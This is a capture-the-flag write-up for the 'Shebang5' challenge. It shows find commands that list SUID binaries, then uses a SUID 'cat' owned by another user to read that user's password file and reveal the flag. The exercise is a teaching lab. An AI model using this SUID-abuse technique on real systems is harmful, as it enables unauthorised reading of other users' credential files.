# Shebang5

> "there is a very bad file on this Server. can yoU fInD it."

Notice the capitalisation of U I & D in the above clue;

That makes me think we're looking for a SUID

```
shebang5@fe2149a30ae1:~$ find / -path /sys -prune -o -path /proc -prune -o -perm /4000
/var/tmp/hi/bash
find: '/var/cache/ldconfig': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/cache/private': Permission denied
find: '/var/log/private': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/private': Permission denied
/var/cat
find: '/etc/ssl/private': Permission denied
find: '/run/lock': Permission denied
find: '/run/sudo': Permission denied
/proc
find: '/home/shebang4': Permission denied
find: '/home/shebang3': Permission denied
find: '/home/shebang2': Permission denied
find: '/home/shebang1': Permission denied
find: '/home/shebang0': Permission denied
/sys
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
find: '/root': Permission denied
```

`/var/cat` looks inteersting?.!

```
shebang5@fe2149a30ae1:~$ ls -al /var/cat
---s--x--x 1 shebang6 root 16992 Oct 14 20:51 /var/cat
```
ok so "**shebang6**" is the owner of this file... now lets see if there are any files owened by 'shebang6';

```
shebang5@fe2149a30ae1:~$ find / -path /sys -prune -o -path /proc -prune -o -user shebang6
find: '/var/cache/ldconfig': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/cache/private': Permission denied
find: '/var/log/private': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/private': Permission denied
/var/cat
/etc/passwords/shebang6
find: '/etc/ssl/private': Permission denied
find: '/run/lock': Permission denied
find: '/run/sudo': Permission denied
/proc
find: '/home/shebang4': Permission denied
find: '/home/shebang3': Permission denied
find: '/home/shebang2': Permission denied
find: '/home/shebang1': Permission denied
find: '/home/shebang0': Permission denied
/sys
find: '/root': Permission denied
```

`/etc/passwords/shebang6` <---- that's got to be something?!

```
shebang5@fe2149a30ae1:~$ /var/cat /etc/passwords/shebang6 
CYCTF{W3ll_1_gu3$$_SU1D_1$_e@$y_fl@g$}
```

And there's the flag;

## CYCTF{W3ll_1_gu3$$_SU1D_1$_e@$y_fl@g$}
